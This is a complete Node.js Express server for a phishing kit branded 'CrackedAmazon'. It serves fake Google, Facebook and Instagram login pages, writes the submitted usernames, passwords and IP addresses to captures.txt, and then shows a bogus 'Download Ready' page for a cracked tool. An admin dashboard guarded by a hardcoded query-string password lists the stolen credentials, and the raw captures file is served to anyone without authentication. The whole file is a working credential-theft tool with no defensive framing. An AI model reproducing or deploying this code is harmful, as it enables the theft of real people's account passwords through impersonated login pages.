const express = require('express');
const session = require('express-session');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Configuration
const ADMIN_PASSWORD = 'Daniel';

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 30 * 60 * 1000 }
}));
app.use(express.static(__dirname));

// Ensure captures directory exists
const capturesDir = path.join(__dirname, 'captures');
if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);

// ============================================
// LOGIN PAGES - SERVED AS SEPARATE FILES
// ============================================

// Google Login Page
app.get('/login/google', (req, res) => {
    res.sendFile(path.join(__dirname, 'login-google.html'));
});

// Facebook Login Page
app.get('/login/facebook', (req, res) => {
    res.sendFile(path.join(__dirname, 'login-facebook.html'));
});

// Instagram Login Page
app.get('/login/instagram', (req, res) => {
    res.sendFile(path.join(__dirname, 'login-instagram.html'));
});

// ============================================
// CAPTURE ENDPOINTS
// ============================================

// Google Capture
app.post('/capture/google', async (req, res) => {
    const { email, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        email,
        password,
        tool: tool || 'unknown',
        ip
    };
    
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ Google:', email, password);
    
    res.redirect(`/download?tool=${tool}`);
});

// Facebook Capture
app.post('/capture/facebook', async (req, res) => {
    const { email, pass, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        email,
        password: pass,
        tool: tool || 'unknown',
        ip
    };
    
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ Facebook:', email, pass);
    
    res.redirect(`/download?tool=${tool}`);
});

// Instagram Capture
app.post('/capture/instagram', async (req, res) => {
    const { username, password, tool } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const data = {
        timestamp: new Date().toISOString(),
        provider: 'instagram',
        username,
        password,
        tool: tool || 'unknown',
        ip
    };
    
    fs.appendFileSync('captures.txt', JSON.stringify(data) + '\n');
    console.log('✅ Instagram:', username, password);
    
    res.redirect(`/download?tool=${tool}`);
});

// ============================================
// DOWNLOAD PAGE
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || 'tool';
    res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Download - CrackedAmazon</title></head>
    <body style="background:#0f172a;color:white;font-family:system-ui;text-align:center;padding:50px;">
        <h1 style="color:#f97316;">Download Ready!</h1>
        <p>Tool: ${tool}</p>
        <button onclick="alert('Download started!')">Download Now</button>
    </body>
    </html>
    `);
});

// ============================================
// ADMIN DASHBOARD
// ============================================
app.get('/admin', (req, res) => {
    const pass = req.query.pass;
    
    if (pass !== ADMIN_PASSWORD) {
        return res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title></head>
        <body style="background:#0f172a;color:white;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh;">
            <div style="background:#1e293b;padding:40px;border-radius:16px;">
                <h2 style="color:#f97316;">Admin Login</h2>
                <form method="GET">
                    <input type="password" name="pass" placeholder="Password" style="padding:10px;margin:10px 0;width:100%;">
                    <button type="submit" style="background:#f97316;color:white;padding:10px;width:100%;border:none;">Login</button>
                </form>
            </div>
        </body>
        </html>
        `);
    }
    
    // Read captures
    let captures = [];
    try {
        captures = fs.readFileSync('captures.txt', 'utf8')
            .split('\n')
            .filter(Boolean)
            .map(line => JSON.parse(line));
    } catch (e) {}
    
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui;}
            body{background:#0f172a;color:white;padding:20px;}
            h1{color:#f97316;margin-bottom:20px;}
            table{width:100%;border-collapse:collapse;background:#1e293b;border-radius:12px;overflow:hidden;}
            th{background:#f97316;color:#0f172a;padding:12px;}
            td{padding:12px;border-bottom:1px solid #334155;}
        </style>
    </head>
    <body>
        <h1>⚡ Admin Dashboard</h1>
        <p>Total Captures: ${captures.length}</p>
        <table>
            <tr><th>Time</th><th>Provider</th><th>Email</th><th>Password</th><th>Tool</th></tr>
    `;
    
    captures.reverse().slice(0, 50).forEach(c => {
        html += `<tr>`;
        html += `<td>${new Date(c.timestamp).toLocaleString()}</td>`;
        html += `<td>${c.provider}</td>`;
        html += `<td>${c.email || c.username || ''}</td>`;
        html += `<td>${c.password || ''}</td>`;
        html += `<td>${c.tool}</td>`;
        html += `</tr>`;
    });
    
    html += `</table></body></html>`;
    res.send(html);
});

// ============================================
// CAPTURES DOWNLOAD
// ============================================
app.get('/captures.txt', (req, res) => {
    res.sendFile(path.join(__dirname, 'captures.txt'));
});

// ============================================
// HOME PAGE
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🔥 SERVER RUNNING ON PORT ${PORT}`);
    console.log(`📍 Admin: /admin?pass=Daniel`);
    console.log(`📍 Google: /login/google`);
    console.log(`📍 Facebook: /login/facebook`);
    console.log(`📍 Instagram: /login/instagram\n`);
});
